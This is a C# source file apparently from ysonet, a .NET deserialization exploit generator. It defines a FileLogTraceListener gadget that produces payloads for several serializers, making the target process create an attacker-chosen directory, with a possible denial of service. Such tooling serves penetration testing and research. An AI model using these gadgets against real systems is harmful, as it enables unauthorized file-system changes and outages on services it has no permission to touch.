using NDesk.Options;
using System.Collections.Generic;
using ysonet.Helpers;

namespace ysonet.Generators
{
    public class FileLogTraceListenerGenerator : GenericGenerator
    {
        private bool rawInput;

        // What this gadget does is create a directory, so the kind is file-system.
        // It does NOT declare PayloadKind.DenialOfService: that facet drives the
        // safeguards in Helpers/Core/DosPolicy.cs (a refusal without
        // --i-understand-dos, plus exclusion from every bulk run), which is meant
        // for a payload whose purpose is to take the target down. The denial of
        // service here is a conditional consequence of WHERE the directory is
        // created, and that belongs in AdditionalInfo(), which states it.
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.FileSystem)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                // fired on 4.8.1
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
        }

        public override string Finders()
        {
            return "Piotr Bazydlo";
        }

        public override string AdditionalInfo()
        {
            return "Microsoft.VisualBasic.Logging.FileLogTraceListener creates the supplied directory through CustomLocation. With elevated privileges, directory creation in sensitive locations may cause denial of service.";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Independent };
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string>
            {
                Formatters.JsonNet,
                Formatters.FastJson,
                Formatters.JavaScriptSerializer,
                "YamlDotNet < 5.0.0",
                "MessagePackTypeless",
                "MessagePackTypelessLz4",
                "SharpSerializerXml",
                "DataContractJsonSerializer",
                Formatters.Xaml
            };
        }

        // TargetPath, not FilePath: -c is a directory the TARGET process creates when the
        // payload runs. Nothing is read on the operator machine, so the generic "this
        // gadget reads the file" prompt of FilePath was wrong here.
        public override CommandInputType CommandInput()
        {
            return CommandInputType.TargetPath;
        }

        public override OptionSet Options()
        {
            return NonRceGadgetPayloadBuilder.RawInputOption(v => rawInput = v);
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            NonRceGadgetPayloadBuilder.RequireInput(inputArgs.Cmd, Name());
            object payload = NonRceGadgetPayloadBuilder.FileLogTraceListener(inputArgs.Cmd, formatter, rawInput);
            return NonRceGadgetPayloadBuilder.Finish(payload, formatter, inputArgs);
        }
    }
}
